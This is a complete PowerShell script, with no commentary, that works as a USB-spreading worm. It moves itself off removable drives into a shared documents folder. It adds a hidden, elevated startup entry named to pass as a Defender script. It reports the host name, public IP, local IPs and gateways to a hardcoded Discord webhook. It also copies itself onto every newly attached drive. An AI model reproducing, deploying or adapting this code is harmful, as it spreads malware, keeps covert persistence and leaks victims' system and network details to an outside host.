$webhookUrl = 'https://discord.com/api/webhooks/1097024921110073364/K6CyIZqz9E4r8jHXQWxfWhnsO_QMf2ejitbzR-YWemf-80raq2L8fEw_EDf451keRDnU'

function Send-ToDiscord {
    param (
        [string]$message
    )

    $payload = @{
        username   = "PowerShell Script Notification"
        content    = $message
    }

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json $payload) -ContentType 'application/json'
}
# just the basics :)
$publicIp = Invoke-RestMethod -Uri 'http://ipinfo.io/ip' -ErrorAction Stop
$systemTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$hostName = $env:COMPUTERNAME

$wifiInterface = Get-NetIPConfiguration | Where-Object { $_.NetAdapter.Status -eq "Up" -and $_.NetAdapter.InterfaceDescription -like "*Wi-Fi*" }
$ethernetInterface = Get-NetIPConfiguration | Where-Object { $_.NetAdapter.Status -eq "Up" -and $_.NetAdapter.InterfaceDescription -notlike "*Wi-Fi*" }

$wifiIp = $wifiInterface.IPv4Address.IPAddress
$ethernetIp = $ethernetInterface.IPv4Address.IPAddress
$wifiGateway = $wifiInterface.IPv4DefaultGateway.NextHop
$ethernetGateway = $ethernetInterface.IPv4DefaultGateway.NextHop

$scriptName = [System.IO.Path]::GetFileNameWithoutExtension($MyInvocation.MyCommand.Name)
$sourceFile = $MyInvocation.MyCommand.Definition
$defenderFolderPath = [System.Environment]::GetFolderPath('CommonDocuments')
$defenderScriptPath = Join-Path -Path $defenderFolderPath -ChildPath "$scriptName.ps1"

$driveType = [System.IO.DriveInfo]::new($PSScriptRoot).DriveType
if ($driveType -eq 'Removable') {
    if (!(Test-Path -Path $defenderFolderPath)) {
        New-Item -ItemType Directory -Path $defenderFolderPath | Out-Null
    }

    try {
        Move-Item -Path $sourceFile -Destination $defenderScriptPath -Force
        Send-ToDiscord -message "**[ I ]** Script was successfully moved to $defenderFolderPath at **$systemTime** on **$hostName**. Public IPv4: **$publicIp** Wi-Fi IP: **$wifiIp** Ethernet IP: **$ethernetIp** Wi-Fi Gateway: **$wifiGateway** Ethernet Gateway: **$ethernetGateway**"
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "StartDefenderScript" -Value "powershell.exe -Command `"Start-Process powershell -ArgumentList '-NoP -Noni -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$defenderScriptPath\`"' -Verb RunAs`""
        Send-ToDiscord -message "**[ S ]** Script set to run at startup."
        exit
    } catch {
        Send-ToDiscord -message "**[ E ]** Failed to move script to Defender folder or set it to run at startup. Error: $_"
        exit
    }
}

try {
    Send-ToDiscord -message "**[ I ]** Script started at **$systemTime** on **$hostName**. Public IPv4: **$publicIp** Wi-Fi IP: **$wifiIp** Ethernet IP: **$ethernetIp** Wi-Fi Gateway: **$wifiGateway** Ethernet Gateway: **$ethernetGateway**"
} catch {
    Send-ToDiscord -message "**[ E ]** Failed to get the public IP. Error: $_"
}

$scriptCopyName = "KEY_$scriptName.ps1"
$scriptCopyPath = Join-Path -Path $PSScriptRoot -ChildPath $scriptCopyName

try {
    Copy-Item -Path $sourceFile -Destination $scriptCopyPath -ErrorAction Stop
    Send-ToDiscord -message "**[ S ]** Copy of the script was successfully created at $scriptCopyPath"
} catch {
    Send-ToDiscord -message "**[ E ]** Failed to create copy of the script at $scriptCopyPath. Error: $_"
}

function Copy-FileToUSB {
    param (
        [string]$driveLetter
    )

    $destinationFileName = $scriptCopyName
    $destinationPath = Join-Path -Path $driveLetter -ChildPath $destinationFileName
    
    try {
        if (!(Test-Path -Path $destinationPath)) {
            Copy-Item -Path $scriptCopyPath -Destination $destinationPath -ErrorAction Stop
            Send-ToDiscord -message "**[ I ]** Script was successfully copied to **'$driveLetter'** at **$systemTime** on **$hostName**. Public IPv4: **$publicIp** Wi-Fi IP: **$wifiIp** Ethernet IP: **$ethernetIp** Wi-Fi Gateway: **$wifiGateway** Ethernet Gateway: **$ethernetGateway**"
        } else {
            Send-ToDiscord -message "**[ S ]** Script copy already exists on $driveLetter at $systemTime on $hostName. No action taken. Public IPv4: **$publicIp** Wi-Fi IP: **$wifiIp** Ethernet IP: **$ethernetIp** Wi-Fi Gateway: **$wifiGateway** Ethernet Gateway: **$ethernetGateway**"
        }
    } catch {
        Send-ToDiscord -message "**[ E ]** Failed to copy script to $driveLetter. Error: $_"
    }
}

function Check-ForNewDrive {
    $existingDrives = Get-PSDrive -PSProvider 'FileSystem'
    
    while ($true) {
        Start-Sleep -Seconds 5
        
        $newDrives = Get-PSDrive -PSProvider 'FileSystem'
        $addedDrives = Compare-Object -ReferenceObject $existingDrives -DifferenceObject $newDrives
        
        foreach ($drive in $addedDrives) {
            if ($drive.SideIndicator -eq '=>') {
                Copy-FileToUSB -driveLetter $drive.InputObject.Root
            }
        }
        
        $existingDrives = $newDrives
    }
}

Check-ForNewDrive
